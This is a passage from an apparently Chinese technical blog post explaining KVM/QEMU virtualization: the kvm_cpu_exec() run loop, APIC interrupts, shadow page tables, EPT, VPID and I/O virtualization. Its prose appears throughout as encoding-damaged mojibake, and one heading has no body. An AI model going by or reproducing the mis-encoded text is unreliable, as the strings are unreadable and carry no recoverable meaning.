¸æ¨¡å—</strong>ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªä¾èµ–äºç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–çš„ä½äº kernel ä¸­çš„ Hypervisorï¼Œæˆ–è€…è¯´<strong>KVM å°† Linux kernel å˜æˆäº† Hypervisor</strong>ï¼Œå¹¶æä¾›äº†ç›¸åº”çš„ç”¨æˆ·æ€æ“ä½œ VM çš„æ¥å£ï¼š <code>/dev/kvm</code> ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ ioctl æŒ‡ä»¤æ¥æ“ä½œ KVM</p><p>ä½† KVM æœ¬èº«ä»…æä¾›äº† CPU ä¸å†…å­˜çš„è™šæ‹ŸåŒ–ï¼Œä¸èƒ½æ„æˆä¸€ä¸ªå®Œæ•´çš„è™šæ‹ŸåŒ–ç¯å¢ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å¤ç”¨ç°æœ‰çš„å…¨è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œ<strong>å°†æ¨¡æ‹Ÿ CPU ä¸å†…å­˜çš„å·¥ä½œäº¤ç”± KVM å®Œæˆ</strong>ï¼Œè¿™æ ·ä¾¿èƒ½ç›´æ¥é€šè¿‡ KVM æ¥å€ŸåŠ©ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ä»¥æé«˜è™šæ‹Ÿæœºæ€§èƒ½</p><p>é‚£ä¹ˆæˆ‘ä»¬æœ‰è¿™æ ·çš„ä¸€ä¸ªç°æˆçš„å®Œå¤‡çš„å…¨è™šæ‹ŸåŒ–å®ç°æ–¹æ¡ˆå—ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„â€”â€”<strong>QEMU</strong> æœ¬èº«ä¾¿<strong>å®Œæ•´æ¨¡æ‹Ÿäº†ä¸€æ•´å¥—è™šæ‹Ÿæœºç¯å¢ƒ</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ QEMU çš„ä»£ç ï¼Œä½¿å…¶é€šè¿‡ KVM æ¥åˆ›å»ºä¸è¿è¡Œè™šæ‹Ÿæœºï¼Œè€Œè®¾å¤‡æ¨¡æ‹Ÿç­‰ä¾æ—§å¤ç”¨åŸæœ‰çš„æ¡†æ¶ï¼Œ<strong>è¿™æ ·æˆ‘ä»¬å°±å®ç°äº†ä¸€ä¸ªé«˜æ€§èƒ½çš„å…¨è™šæ‹ŸåŒ–å¹³å°ï¼šKVM + QEMU</strong></p><p><img src="https://s2.loli.net/2022/08/29/7WByzSrM9QYPsKH.png" alt="image.png"></p><p>åˆ©ç”¨QEMU + KVM è¿›è¡Œè™šæ‹ŸåŒ–çš„æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ul><li>QEMU é€šè¿‡ ioctl è¿›å…¥å†…æ ¸æ€å°†æ§åˆ¶æƒç§»äº¤ KVMï¼ŒKVM è¿›è¡Œ VM çš„è¿è¡Œ</li><li>äº§ç”Ÿ VM-Exitï¼ŒKVM æ¥ç®¡ï¼Œåˆ¤æ–­åŸå› å¹¶å†³å®šç»§ç»­è¿è¡Œè¿˜æ˜¯äº¤ç”± QEMU å¤„ç†</li><li>è‹¥æ˜¯åè€…ï¼Œæ¢å¤åˆ°ç”¨æˆ·æ€ QEMU ä¸­çš„å¤„ç†ä»£ç è¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œä¹‹åé€€å‡ºæˆ–å›åˆ°ç¬¬ä¸€æ­¥</li></ul><p><img src="https://s2.loli.net/2022/08/05/GUxVBYWnbdzA6KD.png" alt="image.png"></p><p>è¿™ä¸ªåŸºæœ¬æ‰§è¡Œæ¡†æ¶å®é™…ä¸Šä¸º QEMU æºç  <code>accel/kvm/kvm-all.c</code> ä¸­çš„ <code>kvm_cpu_exec()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">kvm_cpu_exec</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    cpu_exec_start(cpu);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * å¼€å§‹è¿è¡Œ VMï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ ioctl(kvm_fd, KVM_RUN)</span><br><span class="hljs-comment">         * å½“äº§ç”Ÿ VM-Exit æ—¶ï¼Œé¦–å…ˆåœ¨ KVM ä¸­å®Œæˆå¤„ç†ï¼Œ</span><br><span class="hljs-comment">         * è‹¥äº§ç”Ÿ IOï¼Œåˆ™é€€å‡ºå†…æ ¸æ€ï¼Œå³æ¢å¤åˆ°è¿™é‡Œï¼Œæ¥ä¸‹æ¥è¿›å…¥åˆ°ç”¨æˆ·æ€çš„å¤„ç†</span><br><span class="hljs-comment">         */</span><br>        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">if</span> (run_ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * è¿”å›å€¼å°äº 0 è¯´æ˜ VM è¿è¡Œå‡ºäº†äº›é—®é¢˜ï¼Œ</span><br><span class="hljs-comment">             * è¿™é‡Œä¼šç®€å•å¤„ç†å break æ‰“ç ´å¤§å¾ªç¯ </span><br><span class="hljs-comment">             */</span><br>        <span class="hljs-comment">//...</span><br>        &#125;<br>        <br>        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);<br>        <span class="hljs-comment">/* è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¤§çš„ switchï¼Œæ ¹æ®é€€å‡ºçš„åŸå› è¿›è¡Œä¸åŒçš„å¤„ç†ï¼Œå°±ä¸æ”¾å®Œæ•´ä»£ç äº† */</span><br>        <span class="hljs-keyword">switch</span> (run-&gt;exit_reason) &#123;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_io\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            kvm_handle_io(run-&gt;io.port, attrs,<br>                          (<span class="hljs-type">uint8_t</span> *)run + run-&gt;io.data_offset,<br>                          run-&gt;io.direction,<br>                          run-&gt;io.size,<br>                          run-&gt;io.count);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_MMIO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_mmio\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            address_space_rw(&amp;address_space_memory,<br>                             run-&gt;mmio.phys_addr, attrs,<br>                             run-&gt;mmio.data,<br>                             run-&gt;mmio.len,<br>                             run-&gt;mmio.is_write);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">default</span>:<br>            DPRINTF(<span class="hljs-string">&quot;kvm_arch_handle_exit\n&quot;</span>);<br>            ret = kvm_arch_handle_exit(cpu, run);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (ret == <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* è¿è¡Œç»“æŸï¼Œæ”¶å°¾å¤„ç† */</span><br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h1 id="0x04-ä¸­æ–­è™šæ‹ŸåŒ–"><a href="#0x04-ä¸­æ–­è™šæ‹ŸåŒ–" class="headerlink" title="0x04.ä¸­æ–­è™šæ‹ŸåŒ–"></a>0x04.ä¸­æ–­è™šæ‹ŸåŒ–</h1><p><strong>ä¸­æ–­</strong>ï¼ˆInterruptï¼‰æœºåˆ¶æ˜¯ä¸€ç§ç”¨æ¥é€šçŸ¥ CPU å‘ç”Ÿäº†éœ€è¦å¤„ç†çš„äº‹ä»¶çš„æœºåˆ¶ï¼ŒæŒ‰ç…§å‘ç”Ÿçš„ä½ç½®åˆ†ä¸ºå¤–éƒ¨ä¸­æ–­ï¼ˆæ¥è‡ªå¤–éƒ¨çš„ä¸­æ–­ï¼ŒINTR å¼•è„šä¼ æ¥çš„ä¸ºå¯å±è”½ä¸­æ–­ï¼ŒNMI å¼•è„šä¼ æ¥çš„ä¸ºä¸å¯å±è”½ä¸­æ–­ï¼‰ä¸å†…éƒ¨ä¸­æ–­ï¼ˆè½¯ä¸­æ–­ã€å¼‚å¸¸ã€é™·é˜±ç­‰ï¼‰ï¼Œå®æ¨¡å¼ä¸‹ CPU æ ¹æ®ä¸­æ–­å‘é‡è¡¨æ¥å¯»æ‰¾å¯¹åº”çš„å¤„ç†ç¨‹åºï¼Œä¿æŠ¤æ¨¡å¼ä¸‹åˆ™é€šè¿‡ä¸­æ–­æè¿°ç¬¦è¡¨æ¥å¯»æ‰¾å¤„ç†ç¨‹åº</p><p>ç°ä»£ X86 å¤„ç†å™¨ä½¿ç”¨çš„ä¸­æ–­æ§åˆ¶å™¨ç§°ä¹‹ä¸º <strong>APIC</strong>(Advanced Programmable Interrupt Controller)ï¼Œæ‰€æœ‰çš„æ ¸å¿ƒå…±ç”¨ä¸€ä¸ª I&#x2F;O APIC ï¼Œç”¨äºæ¥æ”¶å¤–éƒ¨ä¸­æ–­ï¼ŒåŒæ—¶æ¯ä¸ªæ ¸ç‹¬ç«‹æœ‰ç€ä¸€ä¸ª <strong>Local APIC</strong>ï¼Œç”¨äºæ¥æ”¶æ¥è‡ª I&#x2F;O APIC çš„ä¸­æ–­ä¿¡æ¯ã€å†…éƒ¨æ—¶é’Ÿä¸­æ–­ã€æ¥è‡ªå…¶ä»–æ ¸å¿ƒçš„ä¸­æ–­ï¼ˆ<strong>Inter-Processor Interrupt</strong>ï¼ŒIPIï¼‰ç­‰</p><p><img src="https://s2.loli.net/2022/08/29/BWGZpyebmVXCcLJ.png" alt="image.png"></p><p>åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒå½“ä¸­ï¼Œæ¯ä¸ª vCPU éƒ½å¯¹åº”éœ€è¦æœ‰ä¸€ä¸ª virtual LAPICï¼Œæ‰€æœ‰çš„æ ¸å¿ƒåˆ™éœ€è¦å…±äº«ä¸€ä¸ª virtual I&#x2F;O APICï¼Œè¿™éƒ½æ˜¯éœ€è¦ Hypervisor è¿›è¡Œæ¨¡æ‹Ÿä¸ç»´æŠ¤çš„</p><h2 id="ä¸€ã€åŸºæœ¬æ¨¡å‹-1"><a href="#ä¸€ã€åŸºæœ¬æ¨¡å‹-1" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¨¡å‹"></a>ä¸€ã€åŸºæœ¬æ¨¡å‹</h2><h1 id="0x05-å†…å­˜è™šæ‹ŸåŒ–"><a href="#0x05-å†…å­˜è™šæ‹ŸåŒ–" class="headerlink" title="0x05. å†…å­˜è™šæ‹ŸåŒ–"></a>0x05. å†…å­˜è™šæ‹ŸåŒ–</h1><p>å†…å­˜è™šæ‹ŸåŒ–æœ¬è´¨ä¸Šæ˜¯éœ€è¦è¾¾æˆä»¥ä¸‹ä¸¤ä¸ªç›®çš„ï¼š</p><ul><li>æä¾›ä¸€ä¸ªåœ¨ Guest æ„ŸçŸ¥ä¸­çš„ä»é›¶å¼€å§‹çš„è¿ç»­ç‰©ç†å†…å­˜ç©ºé—´</li><li>åœ¨å„ä¸ª VM ä¹‹é—´è¿›è¡Œæœ‰æ•ˆçš„éš”ç¦»ã€è°ƒåº¦ã€å…±äº«å†…å­˜èµ„æº</li></ul><h2 id="ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–-1"><a href="#ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–-1" class="headerlink" title="ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–"></a>ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–</h2><h3 id="I-è™šæ‹Ÿæœºå†…å­˜è®¿é—®åŸç†åŠé‡åˆ°çš„é—®é¢˜"><a href="#I-è™šæ‹Ÿæœºå†…å­˜è®¿é—®åŸç†åŠé‡åˆ°çš„é—®é¢˜" class="headerlink" title="I.è™šæ‹Ÿæœºå†…å­˜è®¿é—®åŸç†åŠé‡åˆ°çš„é—®é¢˜"></a>I.è™šæ‹Ÿæœºå†…å­˜è®¿é—®åŸç†åŠé‡åˆ°çš„é—®é¢˜</h3><p>ä¸ºäº†å®ç°å†…å­˜ç©ºé—´çš„éš”ç¦»ï¼ŒHypervisor éœ€è¦ä¸º Guest VM å‡†å¤‡ä¸€å±‚æ–°çš„åœ°å€ç©ºé—´ï¼š<code>Guest Physical Address Space</code>ï¼Œä» Guest ä¾§å…¶åªèƒ½çœ‹åˆ°è¿™ä¸€å±‚åœ°å€ç©ºé—´ï¼ŒHypervisor éœ€è¦è®°å½•ä» GPA åˆ° HVA ä¹‹é—´çš„è½¬æ¢å…³ç³»</p><p>ä¸‹å›¾ä¸º Qemu çš„å†…å­˜æ¶æ„ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Guest&#x27; processes<br>                     +--------------------+<br>Virtual addr space   |<span class="hljs-string">                    </span>|<br>                     +--------------------+                                    ï¼ˆGVAï¼‰<br>                     |<span class="hljs-string">                    </span>|<br>                     \__   Page Table     \__<br>                        \                    \<br>                         |<span class="hljs-string">                    </span>|<span class="hljs-string">  Guest kernel</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">Guest&#x27;s phy  memory </span>|<span class="hljs-string">    </span>|<span class="hljs-string">                    </span>|<span class="hljs-string">                </span>|<span class="hljs-string">            ï¼ˆGPAï¼‰</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">                    </span>|<span class="hljs-string">                                          </span>|<br>                    \__                                        \__<br>                       \                                          \<br>                        |<span class="hljs-string">             QEMU process                 </span>|<br>                   +----+------------------------------------------+<br>Virtual addr space |<span class="hljs-string">    </span>|<span class="hljs-string">                                          </span>|<span class="hljs-string">         ï¼ˆHVAï¼‰</span><br><span class="hljs-string">                   +----+------------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                               </span>|<br>                    \__                Page Table                   \__<br>                       \                                               \<br>                        |<span class="hljs-string">                                               </span>|<br>                   +----+-----------------------------------------------+----+<br>Physical memory    |<span class="hljs-string">    </span>|<span class="hljs-string">                                               </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    ï¼ˆHPAï¼‰</span><br><span class="hljs-string">                   +----+-----------------------------------------------+----+</span><br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¦è®¿é—® Guest ä¸­æŸä¸ªè™šæ‹Ÿåœ°å€ä¸Šçš„æ•°æ®æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p><ul><li>é¦–å…ˆå¾—å…ˆé€šè¿‡ Guest çš„é¡µè¡¨å°† <code>Guest Virtual Address</code> ï¼ˆGVAï¼‰è½¬æ¢ä¸º <code>Guest Physical Address</code>ï¼ˆGPAï¼‰</li><li>GPA åœ¨ Qemu çš„å®ç°å½“ä¸­å®é™…ä¸Šæ˜¯å¯¹åº”æ˜ å°„åˆ° Host ä¸­ä¸€å¤§å— mmap çš„å†…å­˜ä¸Šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°† GPA å†è½¬æ¢ä¸º <code>Host Virtual Address</code>ï¼ˆHVAï¼‰</li><li>æœ€åå†é€šè¿‡ Host ä¸Šçš„é¡µè¡¨å°† HVA è½¬åŒ–ä¸º <code>Host Physical Address</code>ï¼ˆHPAï¼‰</li><li>åœ¨ Guest å¤šçº§é¡µè¡¨çš„å¯»å€å½“ä¸­åŒæ ·ä¹Ÿè¦å¤šæ¬¡ç»è¿‡ <code>GPA-&gt;HPA</code> çš„è½¬æ¢æŸ¥è¯¢è¿‡ç¨‹</li></ul><p>è¿™ä¸€æ•´å¥—æµç¨‹<strong>éå¸¸ç¹é‡</strong>ï¼Œä»è€Œä½¿å¾—è™šæ‹Ÿæœºä¸­å†…å­˜è®¿é—®çš„æ€§èƒ½æä¸ºä½ä¸‹</p><blockquote><p>åœ¨ QEMU å½“ä¸­è®¿é—®å†…å­˜çš„æ ¸å¿ƒå‡½æ•°æ˜¯ <code>address_space_rw()</code>ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥çœ‹ä¸€ä¸‹å…¶å†…éƒ¨å®ç°ï¼Œè™½ç„¶è¯´åªæ˜¯ GPA-&gt;HVAï¼ˆç¬‘ï¼‰</p></blockquote><h3 id="II-å½±å­é¡µè¡¨-ï¼ˆshadow-page-tableï¼‰"><a href="#II-å½±å­é¡µè¡¨-ï¼ˆshadow-page-tableï¼‰" class="headerlink" title="II.å½±å­é¡µè¡¨ ï¼ˆshadow page tableï¼‰"></a>II.å½±å­é¡µè¡¨ ï¼ˆshadow page tableï¼‰</h3><p>åœ¨æ—©æœŸçš„æ—¶å€™ Intel ç¡¬ä»¶å¯¹è™šæ‹ŸåŒ–å¹¶æ²¡æœ‰å¾ˆå¥½çš„æ”¯æŒï¼Œå› æ­¤ Hypervisor åªèƒ½å…ˆåœ¨è½¯ä»¶å±‚é¢è¿›è¡Œä¼˜åŒ–â€”â€”<strong>å½±å­é¡µè¡¨</strong>ï¼ˆShadow Page Tableï¼‰åº”è¿è€Œç”Ÿ</p><p>ä»¥ Intel ä¸ºä¾‹ï¼Œç”±äºè¯»å†™ CR3 å¯„å­˜å™¨ï¼ˆå­˜æ”¾é¡µé¡¶çº§è¡¨æŒ‡é’ˆï¼‰çš„æ“ä½œæ˜¯æ•æ„ŸæŒ‡ä»¤ï¼Œæˆ‘ä»¬çš„ Hypervisor å¯ä»¥å¾ˆè½»æ˜“åœ°æˆªè· VM çš„è¿™ä¸ªæ“ä½œï¼Œ<strong>å¹¶å°†é¡µè¡¨æ›¿æ¢ä¸ºå­˜æ”¾ GVAâ†’HPA æ˜ å°„å…³ç³»çš„å½±å­é¡µè¡¨</strong>ï¼Œè¿™æ ·å°±èƒ½<strong>ç›´æ¥å®Œæˆç”± GVA åˆ° HPA çš„è½¬æ¢è¿‡ç¨‹</strong></p><p><img src="https://s2.loli.net/2022/08/05/eG1hpBbZy6Edszg.png" alt="image.png"></p><p>ä¸ºäº†å®ç°å½±å­é¡µè¡¨ï¼Œæˆ‘ä»¬æœ¬è´¨ä¸Šéœ€è¦å®ç°<strong>MMU è™šæ‹ŸåŒ–</strong>ï¼š</p><ul><li>Guest VM æ‰€èƒ½çœ‹åˆ°ä¸æ“ä½œçš„å®é™…éƒ½ä¸Šæ˜¯è™šæ‹Ÿçš„ MMUï¼ŒçœŸæ­£è½½å…¥ MMU çš„é¡µè¡¨æ˜¯ç”± Hypevisor å®Œæˆç¿»è¯‘åæ‰€äº§ç”Ÿçš„<strong>å½±å­é¡µè¡¨</strong></li><li>å½±å­é¡µè¡¨ä¸­çš„è®¿é—®æƒé™ä¸º<strong>åªè¯»çš„</strong>ï¼Œå½“ Guest æƒ³è¦è¯»å†™é¡µè¡¨æ—¶ä¾¿èƒ½è¢« Hypervisor æ•è·åˆ°è¿™ä¸ªæ“ä½œå¹¶ä»£ä¸ºå¤„ç†</li></ul><p>ä¸è¿‡è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹å°±æ˜¯<strong>æˆ‘ä»¬éœ€è¦ä¸º Guest VM ä¸­çš„æ¯å¥—é¡µè¡¨éƒ½ç‹¬ç«‹ç»´æŠ¤ä¸€ä»½å½±å­é¡µè¡¨ï¼Œä¸”éœ€è¦å¤šæ¬¡åœ¨ VMM ä¸ VM é—´è¿›è¡Œåˆ‡æ¢ï¼Œè¿™å…·æœ‰ä¸€å®šçš„å¼€é”€</strong></p><h2 id="äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–"><a href="#äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–" class="headerlink" title="äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–"></a>äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–</h2><h3 id="III-æ‰©å±•é¡µè¡¨ï¼ˆExtend-Page-Table-EPTï¼‰"><a href="#III-æ‰©å±•é¡µè¡¨ï¼ˆExtend-Page-Table-EPTï¼‰" class="headerlink" title="III.æ‰©å±•é¡µè¡¨ï¼ˆExtend Page Table, EPTï¼‰"></a>III.æ‰©å±•é¡µè¡¨ï¼ˆExtend Page Table, EPTï¼‰</h3><p>ä»è½¯ä»¶å±‚é¢ä¼¼ä¹å·²ç»æ˜¯éš¾ä»¥æœ‰æ›´å¥½çš„ä¼˜åŒ–çš„æ–¹æ¡ˆäº†ï¼Œå› æ­¤ç¡¬ä»¶å±‚é¢çš„å¯¹å†…å­˜è™šæ‹ŸåŒ–çš„æ”¯æŒä¾¿åº”è¿è€Œç”Ÿâ€”â€”<strong>EPT</strong> å³ <strong>Extend Page Table</strong>ï¼Œæ˜¯ Intel ä¸ºå®ç°å†…å­˜è™šæ‹ŸåŒ–è€Œæ–°å¢çš„ç‰¹æ€§ï¼Œç›®çš„æ˜¯ä¸ºäº†å‡å°‘å†…å­˜è®¿é—®çš„å¼€é”€</p><p>EPT å¹¶ä¸å¹²æ‰° Guest VM æ“ä½œè‡ªèº«é¡µè¡¨çš„è¿‡ç¨‹ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯<strong>é¢å¤–æä¾›äº†ä¸€ä¸ª Guest ç‰©ç†åœ°å€ç©ºé—´åˆ° Host ç‰©ç†åœ°å€ç©ºé—´è½¬æ¢çš„é¡µè¡¨</strong>ï¼Œå³ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„é¡µè¡¨æ¥å®Œæˆ <code>GPAâ†’HPA</code> çš„è½¬æ¢</p><p>EPT æ–¹æ¡ˆè™½ç„¶ç›¸æ¯”èµ·å½±å­é¡µè¡¨è€Œè¨€å¤šäº†ä¸€å±‚è½¬æ¢ï¼Œä½†æ˜¯å¹¶ä¸éœ€è¦å¹²æ‰° Guest åŸæœ‰çš„é¡µè¡¨ç®¡ç†ï¼Œ<strong>GVAâ†’GPAâ†’HPA çš„è¿‡ç¨‹éƒ½ç”±ç¡¬ä»¶è‡ªåŠ¨å®Œæˆ</strong>ï¼ŒåŒæ—¶ Hypervisor ä»…éœ€è¦æˆªè· <code>EPT Violation</code> å¼‚å¸¸ï¼ˆEPT è¡¨é¡¹ä¸ºç©ºï¼‰ï¼Œæ•ˆç‡æé«˜äº†ä¸å°‘</p><p><img src="https://s2.loli.net/2022/08/05/BSjJk3zq6ayrXvO.png" alt="image.png"></p><h3 id="IV-VPIDï¼šTLB-èµ„æºä¼˜åŒ–"><a href="#IV-VPIDï¼šTLB-èµ„æºä¼˜åŒ–" class="headerlink" title="IV. VPIDï¼šTLB èµ„æºä¼˜åŒ–"></a>IV. VPIDï¼šTLB èµ„æºä¼˜åŒ–</h3><p><strong>Translation Lookaside Buffer</strong>ä¸ºç”¨ä»¥åŠ å¿«è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢çš„<strong>é¡µè¡¨é¡¹ç¼“å­˜</strong>ï¼Œå½“è¿›è¡Œåœ°å€è½¬æ¢æ—¶ CPU é¦–å…ˆä¼šå…ˆæŸ¥è¯¢ TLBï¼ŒTLB æ ¹æ®è™šæ‹Ÿåœ°å€æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ cacheï¼Œè‹¥ cache miss äº†æ‰ä¼šæŸ¥è¯¢é¡µè¡¨</p><p>ç”±äº TLB æ˜¯ä¸å¯¹åº”çš„é¡µè¡¨è¿›è¡Œå·¥ä½œçš„ï¼Œå› æ­¤åœ¨åˆ‡æ¢é¡µè¡¨æ—¶ TLB åŸæœ‰çš„å†…å®¹å°±å¤±æ•ˆäº†ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>INVLPG</code> ä½¿ TLB å¤±æ•ˆï¼Œç±»ä¼¼åœ°ï¼Œåœ¨ VM-Entry ä¸ VM-Exit æ—¶ CPU éƒ½ä¼šå¼ºåˆ¶è®© TLB å¤±æ•ˆï¼Œä½†è¿™ä¹ˆåšä»å­˜åœ¨ä¸€å®šçš„æ€§èƒ½æŸè€—</p><p><strong>Virtual Processor Identifier</strong>ï¼ˆVPIDï¼‰åˆ™æ˜¯ä¸€ç§ç¡¬ä»¶çº§çš„å¯¹ TLB èµ„æºç®¡ç†çš„ä¼˜åŒ–ï¼Œå…¶åœ¨ç¡¬ä»¶ä¸Šä¸ºæ¯ä¸ª TLB è¡¨é¡¹æ‰“ä¸Šä¸€ä¸ª VPID æ ‡è¯†ï¼ˆVMM ä¸ºæ¯ä¸ª vCPU åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ VPIDï¼Œå­˜æ”¾åœ¨ VMCS ä¸­ï¼Œé€»è¾‘ CPU çš„ VPID ä¸º 0ï¼‰ï¼Œåœ¨ CPU æŸ¥æ‰¾ TLB cache æ—¶ä¼šå…ˆæ¯”å¯¹ VPIDï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— éœ€åœ¨æ¯æ¬¡è¿›è¡Œ VM entry&#x2F;exit æ—¶åˆ·æ‰æ‰€æœ‰çš„ cacheï¼Œè€Œå¯ä»¥ç»§ç»­å¤ç”¨ä¹‹å‰ä¿ç•™çš„ cache</p><h1 id="0x06-I-x2F-O-è™šæ‹ŸåŒ–"><a href="#0x06-I-x2F-O-è™šæ‹ŸåŒ–" class="headerlink" title="0x06. I&#x2F;O è™šæ‹ŸåŒ–"></a>0x06. I&#x2F;O è™šæ‹ŸåŒ–</h1><p>ç°å®çš„å¤–è®¾èµ„æºå¾€å¾€æ˜¯æœ‰é™çš„ï¼ŒåŒæ—¶æˆ‘ä»¬æœ‰çš„æ—¶å€™å¹¶ä¸éœ€è¦è®© VM ç›´æ¥æ¥è§¦åˆ°ç°å®å­˜åœ¨çš„å¤–è®¾èµ„æºï¼Œæœ‰çš„æ—¶å€™æˆ‘ä»¬è¿˜æƒ³ä¸º VM æä¾›ä¸€äº›ä¸å­˜åœ¨å®ä½“è®¾å¤‡çš„è®¾å¤‡ï¼Œå› æ­¤ Hypervisor éœ€è¦é€šè¿‡ IO è™šæ‹ŸåŒ–çš„æ–¹å¼æ¥ä¸º VM æä¾›<strong>è™šæ‹Ÿçš„è®¾å¤‡èµ„æº</strong></p><p>ä»å¤„ç†å™¨çš„è§’åº¦è€Œè¨€ï¼Œæˆ‘ä»¬ä¸å¤–è®¾ä¹‹é—´çš„äº¤äº’ä¸»è¦æ˜¯é€šè¿‡ <code>MMIO</code> ä¸ <code>Port IO</code> æ¥å®Œæˆçš„ï¼Œå› è€Œé’ˆå¯¹å¤–è®¾çš„è™šæ‹ŸåŒ–ç§°ä¹‹ä¸º <strong>I&#x2F;O è™šæ‹ŸåŒ–</strong></p><p>I&#x2F;O è™šæ‹ŸåŒ–éœ€è¦å®ç°ä»¥ä¸‹ä¸‰ä¸ªä»»åŠ¡ï¼š</p><ul><li>è®¿é—®æˆªè·ï¼šHypervisor éœ€è¦æˆªè· VM å¯¹å¤–è®¾çš„è®¿é—®æ“ä½œ</li><li>æä¾›è®¾å¤‡æ¥å£ï¼šHypervisor éœ€è¦ä¸º VM 